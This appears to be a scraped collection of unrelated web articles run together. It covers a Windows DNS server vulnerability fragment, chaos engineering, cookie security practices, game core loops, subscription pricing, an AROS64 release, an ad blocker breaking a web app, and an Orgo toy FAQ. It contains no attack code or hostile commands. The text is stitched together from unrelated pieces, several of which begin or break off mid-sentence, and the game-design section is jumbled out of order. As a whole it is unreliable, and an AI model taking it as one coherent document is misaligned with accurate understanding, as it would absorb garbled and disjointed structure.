The affected versions include Windows Server versions from 2003 to 2019.</p><p><strong>This vulnerability has been in the Microsoft code for more than 17 years.</strong> This means that it’s likely that other attackers may have found and have taken advantage of the issue.</p><p>But according to Microsoft, this vulnerability is not currently known to be used in active attacks. Microsoft ranks this vulnerability as “exploitation more likely,” and it is essential that customers apply Windows updates to address this vulnerability as soon as possible.</p><p>This issue results from a flaw in Microsoft’s DNS server role implementation. It does not affect non-Microsoft DNS Servers. The main reason why this vulnerability exists is due to how Windows DNS server parses an incoming DNS query, as well as how forwarded DNS queries are handled.</p><p>The flaw itself is an integer-overflow bug.

<p>Resilience is something those who use Kubernetes to run apps and microservices in containers aim for. When a system is resilient, it can handle losing a portion of its microservices and components without the entire system becoming inaccessible.</p>



<p>Resilience is achieved by integrating loosely coupled microservices. When a system is resilient, microservices can be updated or taken down without having to bring the entire system down. Scaling becomes easier too, since you don’t have to scale the whole cloud environment at once.</p>



<p>That said, resilience is not without its challenges. Building microservices that are independent yet work well together is not easy. You also have to create and maintain a reliable system with high fault tolerance. This is where Chaos Engineering comes into play.</p>



<h2>What Is Chaos Engineering?</h2>



<p>Chaos Engineering has been around for almost a decade now but it is still a relevent and useful concept to incorporate into improving your whole systems architecture. In essence, Chaos Engineering is the process of triggering and injecting faults into a system deliberately. Instead of waiting for errors to occur, engineers can take deliberate steps to cause (or simulate) errors in a controlled environment.</p>



<p>Chaos Engineering allows for better, more advanced resilience testing. Developers can now experiment in cloud-native distributed systems. Experiments involve testing both the physical infrastructure and the cloud ecosystem.</p>



<p>Chaos Engineering is not a new approach. In fact, companies like Netflix have been using resilience testing through Chaos Monkey, an in-house Chaos Engineering framework designed to improve the strength of cloud infrastructure for years now.</p>



<p>When dealing with a large-scale distributed system, Chaos Engineering provides an empirical way of building confidence by anticipating faults instead of reacting to them. The chaotic condition is triggered intentionally for this purpose.</p>



<p>There are a lot of analogies depicting how Chaos Engineering works, but the traffic light analogy represents the concept best. Conventional testing is similar to testing traffic lights individually to make sure that they work.</p>



<p>Chaos Engineering, on the other hand, means closing out a busy array of intersections to see how traffic reacts to the chaos of losing traffic lights. Since the test is run deliberately, more insights can be collected from the process.</p>



<h2>Why Use Chaos Engineering?</h2>



<p>Let’s start this part by accepting the fact that chaos engineering and fault testing have a lot of overlaps, but the latter tests a specific condition instead of real chaos. Chaos Engineering actually lets you garner more insights, down to identifying nodes that are not behaving as intended and generating errors under certain conditions.</p>



<p>Chaos Engineering is not for testing every condition, but it covers a lot of ground. There are several things you can learn about the system through chaos testing.</p>



<ul><li>Inter-service latency causing bottlenecks and grinding the system to a slow pace can be discovered through Chaos Engineering.</li><li>Routine driver checks to identify how drivers of different versions or variations affect system performance and stability.</li><li>Memory and CPU usage being maxed out and how the condition affects your system, particularly in scalable Elastic environments.</li><li>Fault injection, particularly the introduction of multiple faults at the same time.</li><li>Simulating catastrophic failure of the entire cloud architecture or datacenter.</li></ul>



<p>Chaos Engineering, on the other hand, is not very effective when used to test specific faults, especially when the faults are siloed in one or two microservices. Chaos experiments are also more suitable for revealing effects and impacts that you are not aware of and confirming your suspicions after running into several similar errors.</p>



<h2>The Principles of Chaos Engineering</h2>



<p>From the previous explanations, it is clear that Chaos Engineering is meant to uncover faults and weaknesses in a system. You want to run the Chaos experiment in a controlled and close-to-ideal environment so that there is no bias to worry about.</p>



<p>To run the experiment, there are several principles that you need to follow.</p>



<h3>Formulate a Hypothesis</h3>



<p>This is the start of the experiment. You begin by making assumptions about how the system will react when certain faults and conditions are introduced. The hypothesis lets you identify which metrics to measure.</p>



<h3>Identify Variables</h3>



<p>Chaos Engineering relies on real-life events; the Chaos experiment reflects real-life events and potential situations that you want to anticipate. When choosing variables, you have to think about the probability of those variables manifesting and their estimated impact on your system.</p>



<h3>Automation</h3>



<p>Automated orchestration is another important component of Chaos Engineering. Using automated orchestration, you can perform state condition checks and analyze application and data integrity more comprehensively than when you do everything manually. In fact, manual experiments are far from sustainable.</p>



<h3>Reduced Blast Radius</h3>



<p>The next principle is reduced blast radius, which means running the Chaos experiment in a controlled environment to minimize the damage and influence caused by the test. Most developers run Chaos experiments on their production environment, but with added measures put in place to prevent catastrophic failures. Alternatively, you can create a robust testing environment to further reduce the blast radius.</p>



<h3>Scaling the Blast Radius</h3>



<p>The blast radius can be scaled to further identify system faults. Limiting the blast radius too much may not always yield the best results, which is why it is sometimes necessary to scale the blast radius up in order to identify faults that relate to real-life behaviors of the system.</p>



<p>The principles governing Chaos Engineering, when implemented thoroughly, creates the perfect chaos. It is a lot easier to identify faults and understand their impacts when you have a controlled chaos, a robust monitoring routine, and the ability to observe real-life system behaviors when faults are introduced.</p>



<h2>Are You Ready for Chaos Engineering?</h2>



<p>Lastly, it is important to understand whether your organization is ready for Chaos Engineering. Chaos Engineering requires the basic weaknesses to be plugged first. This means getting your system to a point where it is resilient enough to handle network spikes and service failures. Once the prerequisites are met, you can run Chaos experiments to uncover other weaknesses.</p>



<p>Chaos Engineering also requires your system to have maximum visibility. Fortunately, most cloud architectures and environments are compatible with monitoring tools that maximize system visibility. Optimize Chaos Engineering to review your systems, seek out new systemic weaknesses and improve your infrastructure’s fault tolerance.&nbsp;&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When browsing the web, it can often feel like your privacy is being constantly invaded and your data misused; in the most by companies spying on you to advertise things you don’t really need. </p> <p>As the Moneyed app enables users to view their financial data, it’s vital that privacy and security are built into the core of our tech. One security consideration is cookies: if an attacker stole your session identifier, they could pretend to be you, and potentially view your data. </p> <p>Below is a list of some of the cookie-related procedures we follow at Moneyed. To keep everyone’s data safe, other companies should be doing the same with their cookies (but, as the title suggests, they probably aren’t). </p> <h4>1. Use cookies over sessionStorage or localStorage</h4> <p>The session identifier could be stored in a cookie, sessionStorage, or localStorage. Given that the session identifier is only required by the server, access should be restricted to it; this is possible to do with cookies (see number 4), but not possible with sessionStorage and localStorage. </p> <h4>2. Use only strictly necessary cookies</h4> <p>Strictly necessary cookies do not require consent from the user[1]; this avoids the need for an annoying cookie permission popup and signals to the user that you care about their privacy. </p> <h4>3. Set the secure attribute</h4> <p>The secure attribute requires that the browser only accepts the cookie and only shares the cookie if the site is secure, e.g. served over HTTPS, making it harder for a man-in-the-middle attacker to steal the cookie[2, 3]. </p> <h4>4. Set the HttpOnly attribute</h4> <p>The HttpOnly attribute requires that the browser only share the cookie with the server (via HTTP requests) and specifically prevents scripts running in the browser from accessing the cookie; this makes it harder for a cross site scripting (XSS) attacker to steal the cookie[2, 4]. </p> <h4>5. Set the path attribute to '/'</h4> <p>The path attribute specifies which URL paths the cookie is shared with. Setting the path attribute to '/' means the cookie is shared with any path on the domain[2]; this is best practice as most security measures are based on the origin (rather than path). </p> <h4>6. Don’t set the domain attribute</h4> <p>The domain attribute specifies which URL domains the cookie is shared with. Not including/setting the domain activates the host-only-flag, ensuring that the cookie is only shared with the host that set it; this is preferable to explicitly setting the domain as it excludes subdomains. </p> <h4>7. Set the SameSite attribute to Lax or Strict</h4> <p>The SameSite attribute controls when a cookie is shared with cross origin requests. Strict should be used in preference as it prevents any sharing, whereas Lax allows for top level navigation i.e. when a user follows a link from an external site. </p> <h4>8. Use the '__Host-' name prefix</h4> <p>Adding <code>__Host-</code> as a prefix to the cookie name requires that the Secure attribute is set, the Path attribute is set to '/', and the domain attribute is not set; this acts as a failsafe ensuring that the cookie cannot exist without these attributes. </p> <h4>9. Don’t set max-age or expires</h4> <p>By not setting max-age or expires the cookie becomes a session cookie; this ensures that the cookie is deleted when the user’s session ends. The alternative is needing to remember to delete the cookie, or predict the perfect time in the future to schedule a deletion. </p> <h4>10. Set the same attributes when deleting</h4> <p>When a user logs out, they expect their session to end and therefore that the cookie has been deleted. Cookie deletion is usually achieved by setting a cookie that expires immediately. For this to work the cookie must have the correct combination of attributes e.g. deleting a `__Host-` prefixed cookie requires the Secure, Path, and domain attributes to have the correct values. </p> <h4>Moneyed’s Cookie</h4> <p>Our session cookies incorporate all of the best practices outlined above, the exact header is the one at the top of the page, <code>Set-Cookie: __Host-[name]=[value]; Secure; HttpOnly; Path=/; SameSite=Strict </code> . </p>  <div><h4>Work in tech?</h4> <p>We'd love to hear your feedback on our app (and in exchange, we'll offer you a discounted subscription) </p> </div>  <h4>Moneyed sponsored open source work</h4> <p>The following open source changes have been sponsored by Moneyed to help secure cookies for all, </p> <ul><li>Correctly delete cookies (missing attributes) <a href="https://github.com/pallets/werkzeug/pull/1889" target="_blank" rel="noopener nofollow">Werkzeug #1889 </a></li> <li>Correctly delete cookies (missing attributes) <a href="https://gitlab.com/pgjones/quart/-/commit/2041c0dbbdd69de39d0a839e6f8be5f556c59e01" target="_blank" rel="noopener nofollow">Quart 2041c0db </a></li> <li>Best practices in Quart-Auth <a href="https://gitlab.com/pgjones/quart-auth/-/commit/5a34616f3b71fbb9fba44c9dc79b188b5faedb8d" target="_blank" rel="noopener nofollow">Quart-Auth 0.4 </a></li></ul> <h4>References</h4> <p>[1] Strictly necessary cookies, GDPR <a href="https://gdpr.eu/cookies/" target="_blank" rel="noopener nofollow">https://gdpr.eu/cookies/ </a> <br> [2] MDN Web docs <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" target="_blank" rel="noopener nofollow">Using HTTP cookies </a> <br> [3] MDN Web docs <a href="https://developer.mozilla.org/en-US/docs/Glossary/MitM" target="_blank" rel="noopener nofollow">Man-in-the-middle attacker </a> <br> [4] MDN Web docs <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS)" target="_blank" rel="noopener nofollow">XSS </a> <br> [5] <a href="https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-05" target="_blank" rel="noopener nofollow">RFC6265 draft </a></p></div></div>]]>

The player returns.</p><p><em>Ad infinitum.</em> Until either the player or opponent breaks the loop, because they failed to return the ball.</p><p>Tennis folks call this a rally, but for us, this repeating structure is the game's core loop. It's exactly what we were looking for.</p><p>A core loop is the game's <em>essential activity</em>. Every sport has one, and every game has one:</p><ul><li>Baseball: a pitcher pitches a ball; a batter hits the ball, or misses.</li><li>Football: a quarterback receives the ball, and makes a play.</li></ul><p>Games have larger loops of course! In baseball, runners run to bases around a diamond. There are innings. There are game series.</p><p>But we seek the smallest, tightest loop of the game. Such that if you take this loop away, the game won't work.</p><p>Can you find a game that <em>doesn't</em> have a core loop? Heck, one can argue that visual novels –&nbsp;which are heavily story-based –&nbsp;have a core loop of dialogue navigation.</p><p>Since <a href="https://teamavocado.co/sports-game">we're making a boxing game</a>, let's identify the core loop:</p><ol><li>A boxer throws a punch.</li><li>An opponent evades or blocks the punch, or throws a punch back.</li></ol><p>From that core idea, we can scope our project.</p><h2 id="define-project-milestones">2.

Express a feeling? Fulfill a game jam prompt? Make a game for a certain demographic?</s></li><li>🍏 <s><strong>The Core Loop.</strong> What's the essential activity that defines your game?</s></li><li>👩 <strong>The First Playable.</strong> Get stuff moving on screen ASAP.

Design your game loop's length</h2><p>I think a <strong>good</strong> game is one where the total player time far exceeds the development time.</p><p>Why? Because players can replay your game over and over if it's genuinely fun. On the other hand, you only had to make the game once.</p><p>You get a lot more bang for your buck.</p><p>Part of that comes from the length of the higher-level game loop.</p><p>If you recall Pico Tennis, the <em>essential activity</em> is hitting the ball back and forth. But the higher-level <em>game</em> loop is the <em>rally</em>.</p><p>And in Pico Tennis, a rally lasts maybe a minute. This is important!</p><p>If you're designing for busy people who play games in pockets of time, maybe you want minute-long game loops. So players can play several rounds within the span of a coffee break.</p><p>(An interesting take: Jan Willem Nijman's <em>Minit</em> has game length in its name. Its game loop lasts exactly 60 seconds.)</p><blockquote><p><em>"Man, that's deep. Can I get some dog treats now?"</em></p><p><em>– Paraphrasing my dog, as she stares intently into my soul.</em></p></blockquote><p>Once you understand the idea of a core loop, you start to see them everywhere.</p><p>Take the game of life.</p><p>Not Conway's Game of Life! But actual day-to-day life.</p><p>The core loop of life is a <em>day</em>. And within those iterations lies a life <em>story</em>.</p><p>(From now on, maybe you'll think twice before creating a recurring event in Google Calendar.)</p><p>That's what we're aiming for. With a game's core loop, we tell a story.</p><p>What story do you want to tell?</p><p>In the next blog post, we'll discuss how to go from core loop to <a href="#define-project-milestones">First Playable</a>.</p><hr><h2>🏃‍♀️ Exercise</h2><p>Try it!</p><p>Head over to the PICO-8 BBS.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Reading time 4-6 minutes</p><h4>Defining your pricing model when you have a subscription business can be difficult.<br></h4><p>Lots of subscription businesses struggle with pricing. How much to charge? or Which pricing model will work best for my subscription business?. The right model can make the difference between capturing customers or losing them. Setting your subscription pricing model helps you to structure how you’ll be charging your customers.&nbsp;<br></p><p><strong>Let's start by understanding what a subscription pricing strategy is in the first place?</strong><br></p><p>The subscription pricing strategy will help you set the pricing model to charge your customers while subscribed for your product. Products can be anything you sell on a recurring basis, such as coffee, software, a washing machine, or even furniture that customers pay monthly. Pricing your product may vary depending on various factors.&nbsp;<br></p><p>In this blog, we'll look at some the most common subscription pricing models, metrics to consider when setting your pricing strategy and how to keep your pricing table looking great.<br></p><p><strong><em>These are some of the questions you need to consider before looking into the subscription pricing models:&nbsp;</em></strong><br></p><ol role="list"><li><strong>What is my business model?&nbsp;</strong></li></ol><p>Think of; What is our customer segment?; Our competitors?; What makes our business unique?. This is important when it comes to selecting your price range as you'll be making sure you are offering the value you are promising to customers.<br></p><p>If you are working on a highly competitive market, you should differentiate on other factors than pricing alone, while niche markets have fewer customers and tend to have higher subscription prices with stronger customer relationships.&nbsp;<br></p><ol start="2" role="list"><li><strong>How to differentiate our company?&nbsp;</strong></li></ol><p>What is our unfair advantage? What is our value proposition? Why would customers care for our product or service? Having a clear understanding of these questions is crucial before setting your pricing strategy as you can differentiate better from other competitors.&nbsp;<br></p><ol start="3" role="list"><li><strong>Who are our customers?&nbsp;</strong></li></ol><p>Most of the time, companies tend to set benefits with price ranges that don't match their customer segment. Put your customers at the center and understand what they need; this will allow your company to better serve your customers.&nbsp;&nbsp;<br></p><ol start="4" role="list"><li><strong>What are our fixed and variable costs?&nbsp;</strong></li></ol><p>How much is our company incurring every month? All costs should be taken into consideration. We have a <a href="https://www.firmhouse.com/product-as-a-service-business-case-calculator-firmhouse">business calculator</a> totally free to use, that can help you when defining your cost structure.&nbsp;<br></p><p><em>Fixed costs:</em> Office rent, payroll, software and tools, <a href="https://www.firmhouse.com/blog/drivers-of-servitization-part-2">services</a>, taxes, etc.&nbsp;</p><p><em>Variable costs:</em> Travel, business expenses, etc.&nbsp;<br></p><p>Make sure you are setting a <a href="https://www.firmhouse.com/blog/the-product-as-a-service-business-case-calculator">sustainable price</a> that is high enough to maintain healthy margins. You can also get in contact with one of our <a href="https://www.firmhouse.com/contact">sales experts</a> if you need any extra help.</p><h4><strong>5 Most Common Subscription Pricing Models</strong><br></h4><p><strong>Now, let's take a look into the 5 popular subscription pricing models such as; flat-rate pricing, tiered pricing, volume pricing, pay per user and pay per feature.&nbsp;</strong></p><p>‍</p><figure><p><img src="https://assets-global.website-files.com/5e4302c3ff8f98b64643b252/5edf52f20341e81441658100_Screenshot%202020-06-09%20at%2011.06.59.png" alt=""></p></figure><p>‍</p><p><strong>1. Flat-rate pricing</strong><br></p><p>This is the traditional pricing option, especially for SaaS companies. It's a straightforward option, with a single product offering, fixed price per month, and a set of features.&nbsp;<br></p><p>Regardless of how many units are purchased, the unitary costs remain the same.&nbsp;<br></p><p><strong>Pros of flat-rate pricing:</strong></p><ul role="list"><li><strong>Build your customer base.</strong> Subscription pricing models can be complicated, and establishing your customer base is crucial, especially if you are just getting started. Flat-rate pricing allows you to narrow your product offering and to focus on growing and retaining new customers.&nbsp;<br></li></ul><ul role="list"><li><strong>Easier to communicate and to sell.</strong> Flat-rate pricing is offered to one type of customer, making it easy to focus your marketing and sales efforts on selling to a clearly-defined customer.&nbsp;<br></li></ul><p><strong>Cons of flat-rate pricing:</strong></p><ul role="list"><li><strong>Limits the potential future gains.&nbsp; </strong>If you are targeting small businesses where they are more price-sensitive, you'll miss out on the opportunity to charge any other potential revenues from different customer segments.&nbsp;<br></li></ul><ul role="list"><li><strong>Just one shot to acquiring customers. </strong>Customers either love your product and decide to buy it, or they don't. There's little space for you to convince them about buying your product. Also, there’s no room for you to customise your offering.&nbsp;<br></li></ul><p><strong>Example:&nbsp;</strong></p><p><a href="https://basecamp.com/welcome-back"><strong>Basecamp</strong></a><strong> is a great example of flat-rate pricing.&nbsp;</strong></p><figure><p><img src="https://assets-global.website-files.com/5e4302c3ff8f98b64643b252/5edf6ddcc70bdd182cf45a0b_basecamp%20pricing.png" alt=""></p></figure><p><strong>2. Tiered pricing&nbsp;</strong><br></p><p>With a tiered pricing model, you will have different pricing levels. These are products within a particular price range. With the tiered pricing model, you can offer multiple packages with various features, product combinations, and different pricing.&nbsp;<br></p><p>Your product price will go up accordingly to the number of users, purchases, or features needed. Let's say; your customer would pay the same price for the first tier, say, 1 to 100 units, then the price would be lower for the second tier and even lower if they reach a third tier.&nbsp;<br></p><p>Once customers fill up a tier, they move to the next level. Customers will be charged accordingly to the number of purchases they make in each tier.&nbsp;<br></p><p><strong><em>Let's dive a little deeper.</em></strong><br></p><p>The average number of packages can vary, but companies in the subscription space usually have three tiers to differentiate the price points while some others have even more options.&nbsp;<br></p><p>The idea behind a tiered pricing strategy is that your prices and features are tailored according to your customers' needs and use cases.<br></p><p><strong>Pros of Tiered pricing:</strong></p><ul role="list"><li><strong>Tailored packages to suit multiple customers: </strong>While the flat-tire option only resonates to one target customer, tiered pricing can be set to tailor your packages to suit different customer segments.&nbsp;<br></li></ul><ul role="list"><li><strong>It gives you more space to grow.</strong> The tiered pricing strategy gives you a direct route to your customers' next price point so they can buy it when they are ready.&nbsp;<br></li></ul><ul role="list"><li><strong>It gives your company more flexibility:</strong> You can offer a combination of features to various customer segments with different price points. Tiered pricing gives your company flexibility to charge customers in a fast-paced market.&nbsp;<br></li></ul><p><strong>Cons of Tiered pricing:&nbsp;</strong></p><ul role="list"><li><strong>Attract to too many different customer segments. </strong>While this is not something completely wrong, customers can get overwhelmed with so many different choices. It's attractive to create several packages to appeal to every need of your customer, but remember that you can't be everything to everyone. Remember who your customers are and what they value the most.&nbsp;<br></li></ul><ul role="list"><li><strong>It can get messy. </strong>When customers face too many choices, it might lead to indecision on which one to buy. It is also hard to communicate well when a company has outgrown their ‘tier’ and has to move onto a higher ‘tier’. This is why it is also essential to make them aware that your sales or customer team is always there to help them decide which option is best for them.&nbsp;<br></li></ul><p><strong>Tier pricing Structure:</strong><br></p><ul role="list"><li><strong>Basic tier:</strong> Required features customers need to get started using your product.&nbsp;</li><li><strong>Standard tier:</strong> A combination of basic and premium tiers. This tier allows you to show more of your product benefits with an accessible price range and is an ideal source of potential revenue for your company.</li><li><strong>Premium tier:</strong> Usually, for large enterprises and companies that recognise the direct benefit of buying your products over the long run. In a premium tier mostly there are possibilities for specialisations, customisations or additional services.&nbsp;<br></li></ul><p><strong>3. Volume pricing</strong><br></p><p>Similar to tiered pricing, there are different pricing levels to encourage larger (volume) orders. ALL product(s) have the same price when a customer purchases. The price of all the units you're selling is within the set price range.&nbsp;<br></p><p>If your companies' key differentiator is volume, then this is the right option for you.&nbsp;<strong>‍</strong></p><p><strong>4. Pay Per User Pricing&nbsp;</strong><br></p><p>Pay per User is a popular volume measurement, especially when it comes to corporate or enterprise licensed software. Prices scales along with the number of users.&nbsp;<br></p><p><strong>Pros of Pay per User Pricing:</strong></p><ul role="list"><li><strong>It's straightforward.</strong> Per user pricing is simple to understand and simple to sell. Customers can calculate monthly costs based on the number of users they have.<br></li></ul><ul role="list"><li><strong>Opportunity to scale along with the adoption. </strong>Your revenue scales directly with the adoption, making it easier to predict and calculate your forecast each month. The more users you add; generally the cheaper it gets.<br></li></ul><p><strong>Cons of Per per User Pricing:&nbsp;</strong></p><ul role="list"><li><strong>It limits the adoption of your product. </strong>If customers don't perceive more value for buying your product for more users, they could use the same user account for different employees which could incentivise sharing a single login between different team members.</li></ul><ul role="list"><li><strong>It can increase your churn rate and it doesn't really reflect the value of your product.</strong> If it doesn't make a difference for a company that has 10 or 100, by limiting the adoption, you make it easier for customers to abandon your service.&nbsp;<br></li></ul><p><strong>5. Pay Per Feature Pricing&nbsp;</strong><br></p><p>As typically seen in SaaS companies pricing strategies, pay per feature allows customers to pay for the features they consider important or those that they need the most.&nbsp;<br></p><p>Often we see three tiers because it creates a reference for the pricing. The goal is to optimize the pricing for the middle levels, and leave the edges to capture prospects slightly deviated from your customer segment.&nbsp;<br></p><p>People perceive value in different ways. Many of your customers will buy the tier higher than the one they actually need because it's perceived to be a better deal for them.&nbsp;</p><p><strong>Pros of Per Feature Pricing:&nbsp;</strong></p><ul role="list"><li><strong>Motivation to upgrade the package. </strong>With each different package, your customers will be unlocking different features and functionalities that work accordingly to their needs.&nbsp;<br></li></ul><ul role="list"><li><strong>Show the value they will get with each package.&nbsp; </strong>Some of the features you are offering may require an additional amount of resources to deliver, per feature pricing allows you to show the extra benefits by putting these features into your top-tiers.</li></ul><p><strong>Cons of Per Feature Pricing:&nbsp;</strong></p><ul role="list"><li><strong>It's hard to get it right.</strong> Unless you know your customer really well, it is hard to set up your price based on the features you think they'll like.&nbsp;<br></li></ul><p>Spend some time understanding which features are more important to which …</p></div></div></div>

<p>I updated the AROS64 source I had to the new stabilized ABIv1 AROS64 introduced by deadw00d (see source on <a rel="noreferrer noopener" href="https://github.com/deadw00d/AROS" target="_blank">github</a>). At the start  I had some tiny problems,  e.g. collect-aros was crashing here as well. But in contrast to the main SMP AROS64/Icaros64 after my bug report, it was fixed very fast. Therefore I was able to compile at 64 bit AROS again using FreePascal, very nice. I also tried some of my old programs and all work rather nicely, some tiny problems of course but overall not bad. I will try to investigate what of these programs are from my code or fpc code and what comes from AROS64 itself. I’m not sure if more bug reports are wanted (because I guess deadw00d aims more to the AxRT) but maybe I will try it.</p>

<p>Because that worked so flawless, I decided to create a new version of my AROS64 distribution “The 100% useless AROS distribution” this time already much more stable and much more useful than before.</p>



<p>I added some more programs, (not only my own) the FP-IDE does work, but sadly the compilation still crash, so you have to use the shell to compile. I even got the network to work and MUIMapparium shows the map nicely and search also works, so maybe the name is somewhat wrong now, it’s only 99% useless, after all? Nevertheless have fun with it.</p>

<![CDATA[How a Chrome Extension Broke My Web App]]>

July 17, 2020 | https://alexkondov.com/how-a-chrome-extension-broke-my-web-app/ | <a href="https://web.archive.org/web/*/https://alexkondov.com/how-a-chrome-extension-broke-my-web-app/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After a long break from personal projects, the situation around the virus inspired me to build something on the side again. I’ll spare you the details but I decided to build a new kind of job board that would let developers browse open positions based on the technologies they are interested in.</p>
<p>It’s a straight forward full-stack JavaScript application that uses React in the browser, Express on the server and Dynamo for storage. As much as I wanted to give Go, or Svelte a try I wanted to ship something fast. Learning a new technology on the go wasn’t compatible with that goal.</p>
<h2>The First Tests</h2>
<p>So I invested around 40-50 hours in an alpha version that had all the basic functionality in place. It wasn’t visually fascinating but it got the job done. I decided to Heroku for the Express app and Vercel for the React one.</p>
<p>Once the alpha version was ready, I entered a few commands in the terminal and I it deployed for the world to see. I sent it to a couple of my friends to get some feedback. They told me what they liked and what they didn’t and uncovered a few bugs along the way. I had plenty of work to do.</p>
<h2>“Probably nothing serious…”</h2>
<p>One of the bugs they discovered was quite unfortunate. The most important feature of the app was a rich, long form which had a lot of client side functionality. It has different fields, WYSIWYG editors, file uploads, drag and drop elements and what not. Turns out the whole form didn’t on Chrome.</p>
<p>The app was still in its infancy so I didn’t pay much attention to that. I had probably broken something small by accident just before deploying. I didn’t even open the console because I expected to see <code>cannot read property state of undefined</code> or something in those lines. You know what I mean.</p>
<p>Probably nothing serious. So did I think…</p>
<h2>The Plot Thickens</h2>
<p>A couple of weeks later I had made some improvements and fixes. I settled on a name, picked fonts and colors and gave the app a bit of personality. It was time to ship the next version. I tested locally and everything worked fine, including the form.</p>
<p>I run a few commands, type the domain name in the browser and there it is. Everything looks great. I send out the links again and wait for the responses, tapping my foot on the floor. The three dots signaling that someone is writing appeared in the chat box. A couple of seconds later the first message popped up - “The form doesn’t work again”.</p>
<p>That’s not right I tested multiple times. I checked the console and there weren’t even warnings. I didn’t want this to be a blocker for the test so I rolled my sleeves up and started digging. I opened the form on the production environment. Wrote a few letters in one of the text fields - and the form didn’t work.</p>
<p>There’s a small preview widget on the side that should be updated as you type but it wasn’t working. No errors in the console either. I run the app locally and everything works seamlessly. There’s something wrong with the production environment.</p>
<p>But how could that impact the page? I didn’t use any environment variables there, nothing platform specific either. I decided to check the behavior in different browsers. Started Firefox, went to the app and opened the form. It worked. Everything was updated as expected. I started Safari and checked the form there. Everything works again.</p>
<h2>We Knot Who, But We Don’t Know Why</h2>
<p>My friend experienced the same behavior - the bug was only in Chrome. I was completely puzzled. I never thought that Chrome of all browsers would be causing unexpected bugs. It’s usually the others that require special attention. At least I know where the problem is - time to dig.</p>
<p>I rolled my sleeves up and opened the dev tools. I wasn’t using any unsupported browser APIs so it’s not that. No application errors but in the Network tab I see that some of the requests are marked as blocked without a status code for the response. Huh?</p>
<p>Unsurprisingly, those requests are for the JavaScript bundles that make the form page functional. The other pages are working fine, though. Their JS gets downloaded successfully. The one for the form, however, is marked as blocked without any message or any response.</p>
<p>My first thought was that a security rule in Chrome could be blocking the files for some reason. I did some reading around cookies, CORS, checked the configuration in Vercel but found no leads there. I scoured the web (and by that I mean Stack Overflow), searched for different phrases and problems that could give me some insight into what is happening.</p>
<p>No thread, or documentation page held any answers for me.</p>
<h2>On The Verge Of Desperation</h2>
<p>What I thought would be a trivial problem related to a missing check in JavaScript turned out to be a massive blocker. I can’t ship the app without the form. If it was failing only in Safari I could live with it. But this is Chrome - everybody’s using it.</p>
<p>At this point I had already spend my Saturday afternoon with no success. The wise thing here would be to call it a day and go back tomorrow with a clean mind. But since I was so invested I pressed on and continued to jam random words related to the problem in the search bar.</p>
<p>Then something happened. Somehow I put the correct combination of words, the stars aligned and at the top of the list I saw a link. It still had the blue color of a page that I still hadn’t opened. It was a question on Stack Overflow, of course.</p>
<p>I had already opened around 10 such threads, all with similar names, but hope dies last. I click on the link, hold my breath and start digging through the comments. Most of the responses and ideas I had already tried, they were of no help. But as I was about to click the back button, my eye was caught by one of the responses lower on the list. </p>
<h2>A New Hope</h2>
<p>It had the meager 7 upvotes but it was worth the try. All it said was to check the Chrome extensions since one of them could be interfering with the network call. Up until this moment I hadn’t even thought about them. They have access to everything on the page but in my 6 years of web development I hadn’t experienced any problems because of an extension.</p>
<p>But at this point I couldn’t rule it out.</p>
<p>I once again examined the unfortunate bundle. They are all named with an identifier, followed by a hash and the file extension - <code>index</code>, <code>create</code>, <code>listing</code>, <code>advert</code>. The blocked one that was breaking the form page was the <code>advert</code> bundle. I looked at the name for a second. Then I looked at the line of extensions next to the address bar. I looked at the name again. Then back to the extensions. Oh no…</p>
<p>A small red icon on the extension bar caught my attention - the AdBlocker. Could this be it? I disabled the AdBlocker and lo and behold - the page was fully functional. My friend got the same result. Apparently because the file contained the word <strong>advert</strong> it was getting blocked by the extension.</p>
<p>Everyone that tested on Chrome experienced the problem with the form. That’s because that’s their default browser and they most likely have some ad blocking add-on. Once they switched to another browser which they didn’t use and had no extensions installed, everything would work.</p>
<p>I didn’t expect AdBlocker to be that unforgiving but as a person who is not that fond of ads, I should be careful what domain language I use in my applications.</p>
<h2>Live To Tell The Tale</h2>
<p>So, this is it. The result of a Saturday afternoon spent debugging obscure problems. After such a session you usually go out of the room with a stern look on your face. Walking like a veteran with all your knowledge and the things you’ve seen. Well, I can’t say I learned anything new but I’ll be really careful with how I name my files from now on.</p></div></div>]]>

      <h2>Orgo Multiple Choice FAQ</h2>

<form name="faqform" action="" method="POST">
    <p><strong>What is Orgo, anyway?</strong></p>
 A game without rules.
<br> A fun toy for geeks.
<br> Some wooden pieces and a deck of cards in a cigar box.
<br> I didn't order this, I don't know what it is.

<p><strong>How do I play?</strong></p>
 Pick a molecule card and construct it with the pieces.
<br> Make a molecule with the pieces and figure out what it is.
<br> Make up your own rules (and <a href="mailto:saul@saul.pw">send them to me</a>).

<p><strong>Which elements are included in Orgo?</strong></p>
 Hydrogen
<br><strong> Carbon</strong>
<br><span> Nitrogen</span>
<br><span> Oxygen</span>
<!--br/><input type="checkbox" name="elements" value="a5"><span style="color:yellow;"> Sulfur</span></input>
<br/><input type="checkbox" name="elements" value="a6"><span style="color:green;"> Phosphorus</span></input-->

<p><strong>Is Orgo actually any fun?</strong></p>
 Absolutely!  Orgo is at least as fun as learning organic chemistry.
<br> Orgo is science, not entertainment.  Stop trying to have fun and get back to studying.
<br> Video game sales are down while organic chemistry enrollments are up.  You decide.

<p><strong>Can I buy a set?</strong></p>
 For $200 you can buy an autographed limited-edition prototype.
<br> For $50 you can pre-order a set via Kickstarter.
<br> For $20 you can buy a cheaply-made set from Amazon.
<br> No.  No copies of Orgo exist.  Even the prototype shown was burned at a desert festival in a display of ritualized impermanence.

<p><strong>What future plans might you have for Orgo (depending on interest)?</strong></p>

      18 more molecule cards (54 total), including TNT and acetaminophen.
      
      <br>

      Automated card production, with the molecule name on the back.

<br>
      Add larger functional groups (COOH, ketone, amine, methyl, etc).
      
<br>
      Add Sulfur and Phosphorous atoms and bonds.
      


    <p><strong>How was Orgo made?</strong></p>

The <a href="https://www.saul.pw/orgo/bonds.svg">atoms and bonds (svg)</a> are lasercut from 3mm plywood.
<br>
